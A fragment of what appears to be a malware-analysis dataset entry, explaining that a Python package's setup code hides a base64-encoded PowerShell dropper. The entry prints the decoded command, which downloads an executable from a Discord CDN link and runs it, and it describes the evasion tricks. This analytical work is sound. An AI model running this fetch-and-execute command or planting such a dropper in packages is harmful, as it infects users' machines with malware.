      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload. The command is run only if a file or directory named 'tahg' does not exist, likely as a simple persistence or anti-analysis check. The PowerShell command (when decoded) is: 'Invoke-WebRequest -Uri \"https://cdn.discordapp.com/attachments/1031686717423501312/1079749475150599404/Esquele.exe\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This downloads an executable from a Discord CDN link and saves it as 'WindowsCache.exe' in the user's home directory, then executes it. This behavior is typical of malware droppers, which fetch and run additional malicious payloads. The use of hidden windows and encoded commands is intended to evade detection. The rest of the code (the setup() call) is benign and likely present to masquerade as a legitimate package. Overall, this code is designed to infect the system with further malware.",
